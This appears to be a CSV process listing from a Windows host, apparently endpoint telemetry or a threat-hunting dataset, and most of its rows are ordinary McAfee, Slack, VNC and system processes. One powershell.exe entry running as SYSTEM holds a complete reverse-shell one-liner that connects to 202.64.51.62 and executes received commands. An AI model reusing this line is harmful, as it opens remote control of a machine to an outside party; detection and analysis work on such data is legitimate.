hostname,name,arguments,username,path,pid
NT627JYR,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",jackson.haye,C:\Program Files\Common Files\McAfee\MMSSHost,4170
NT627JYR,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,NT AUTHORITY\SYSTEM,C:\Windows\system32,3748
NT627JYR,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",jackson.haye,C:\Program Files\McAfee\MAT,5924
NT627JYR,GitHubDesktop.exe,"""C:\Users\jackson.haye\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=9 12 13 23 27 29 49 70 84 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=29571E74A71F5219E432184D13D76C95 --mojo-platform-channel-handle=1732 /prefetch:2",jackson.haye,C:\Users\jackson.haye\AppData\Local\GitHubDesktop\app-1.4.3,2223
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,2168
NT627JYR,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,5688
NT627JYR,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",aust.edward42,C:\Program Files\RealVNC\VNC Viewer,3782
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,2564
NT627JYR,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,3908
NT627JYR,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",jackson.haye,C:\ProgramData\McAfee\Direct,2184
NT627JYR,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,jackson.haye,C:\ProgramData\McAfee\Direct,3193
NT627JYR,LogonUI.exe,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",NT AUTHORITY\SYSTEM,C:\Windows\system32,2844
NT627JYR,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,jackson.haye,c:\program files\common files\mcafee\modulecore,964
NT627JYR,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,5624
NT627JYR,powershell.exe,"$client = New-Object System.Net.Sockets.TCPClient(""202.64.51.62"",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ""PS "" + (pwd).Path + ""> "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,4196
NT627JYR,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",jackson.haye,C:\Program Files\Common Files\McAfee\AMCore,3248
NT627JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",jackson.haye,C:\Program Files\TightVNC,1561
NT627JYR,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\jackson.haye\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",jackson.haye,C:\Users\jackson.haye\AppData\Local\Temp\scoped_dir9616_4071,433
NT627JYR,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,NT AUTHORITY\SYSTEM,C:\Windows\System32,3912
NT627JYR,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,jackson.haye,C:\ProgramData\McAfee\McInstruTrack,630
NT627JYR,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",jackson.haye,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,1358
NT627JYR,Calculator.exe,"""C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1809.2731.0_x64__8wekyb3d8bbwe\Calculator.exe"" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca",jackson.haye,C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1809.2731.0_x64__8wekyb3d8bbwe,6158
NT627JYR,MpCmdRun.exe,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Defender,1264
NT627JYR,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},NT AUTHORITY\SYSTEM,C:\Windows\System32,3028
NT627JYR,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,2464
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,NT AUTHORITY\SYSTEM,C:\Windows\system32,2656
NT627JYR,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",jackson.haye,C:\Program Files\Common Files\McAfee\VSCore_18_6,6081
NT627JYR,TabTip32.exe,/loadhooks /Parent:0000000000001188,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,5288
NT627JYR,slack.exe,"C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1\slack.exe --reporter-url=https://slack.com/apps/breakpad?instanceUid=c116fa6f-e78f-4f7e-9927-09567265c493&amp;version=3.1.1&amp;channel=prod --application-name=Slack ""--crashes-directory=C:\Users\aust.edward42\AppData\Local\Temp\Slack Crashes"" --v=1",aust.edward42,C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1,3104
NT627JYR,svchost.exe,C:\Windows\System32\svchost.exe -k smbsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,3784
NT627JYR,OneDrive.exe,"""C:\Users\aust.edward42\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",aust.edward42,C:\Users\aust.edward42\AppData\Local\Microsoft\OneDrive,594
NT627JYR,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",jackson.haye,C:\Program Files\Common Files\McAfee\PEF\CORE,6413
NT627JYR,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},NT AUTHORITY\SYSTEM,C:\Windows\system32,4092
NT627JYR,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",jackson.haye,C:\Program Files\Common Files\McAfee\TaskScheduler,5907
NT627JYR,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,6060
NT627JYR,sihost.exe,sihost.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,1544
NT627JYR,slack.exe,"""C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1\slack.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=7 10 11 20 24 26 43 63 76 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=801A57F64621336F74806802DB83B30B --mojo-platform-channel-handle=1628 /prefetch:2",aust.edward42,C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1,3626
NT627JYR,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",jackson.haye,C:\Program Files\Common Files\McAfee\ModuleCore,5981
NT627JYR,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",jackson.haye,c:\program files\common files\mcafee\modulecore,3394
NT627JYR,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,2256
NT627JYR,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",jackson.haye,C:\Program Files\Common Files\mcafee\Platform,4709
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,5044
NT627JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",aust.edward42,C:\Program Files\TightVNC,1190
NT627JYR,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,3884
NT627JYR,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",jackson.haye,C:\Program Files\McAfee\WebAdvisor,2222
NT627JYR,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",jackson.haye,C:\Program Files\RealVNC\VNC Viewer,4295
NT627JYR,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",jackson.haye,C:\Program Files\McAfee\WebAdvisor,1168
NT627JYR,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",jackson.haye,C:\Program Files\Common Files\McAfee\Platform\Core,6119
NT627JYR,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,5224
NT627JYR,GitHubDesktop.exe,"""C:\Users\jackson.haye\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --squirrel-firstrun",jackson.haye,C:\Users\jackson.haye\AppData\Local\GitHubDesktop\app-1.4.3,6351
NT627JYR,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,1872
NT627JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",jackson.haye,C:\Program Files\TightVNC,3962
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel,NT AUTHORITY\SYSTEM,C:\Windows\system32,5684
NT627JYR,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,864
NT627JYR,slack.exe,"""C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1\slack.exe""",aust.edward42,C:\Users\aust.edward42\AppData\Local\slack\app-3.1.1,4538
NT627JYR,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,6152
NT627JYR,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,5952
NT627JYR,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",jackson.haye,C:\Program Files\McAfee\MfeAV,4480
NT627JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",aust.edward42,C:\Program Files\TightVNC,5491
NT627JYR,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",jackson.haye,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,4464
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,2756
NT627JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,5472
